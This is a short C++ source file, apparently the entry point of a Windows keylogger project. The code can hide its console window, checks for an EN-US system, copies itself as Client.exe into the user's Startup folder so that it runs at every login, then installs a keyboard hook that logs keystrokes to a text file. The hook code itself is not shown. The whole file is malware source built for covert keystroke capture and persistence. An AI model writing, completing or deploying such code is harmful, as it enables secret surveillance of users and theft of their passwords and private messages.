#define WIN32_LEAN_AND_MEAN

#include "KeyboardHook.h"
#include"vector"
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

//Falta tratar do release hook

int main(){

	//This variable defines the logFile name
	std::string log = "logFile.txt";

	//This variable defines if the terminal is displayed while the keylogger is running
	bool display_terminal = true;

	if(!display_terminal){
		ShowWindow( GetConsoleWindow(), SW_HIDE );
	}

	//Verify if the system is in EN-US to add the program to the startup directory
	//This can be improved
	if(GetUserDefaultUILanguage() != 1033){
		exit(EXIT_FAILURE);
	}

	fs::path startup = "C:/Users/" + std::string(std::getenv("USERNAME")) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";

	if(!fs::equivalent(startup, fs::current_path())){
		startup += "Client.exe";
		rename("Client.exe", startup);
	}

    SetHook("kappa.txt");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)){

	}
}

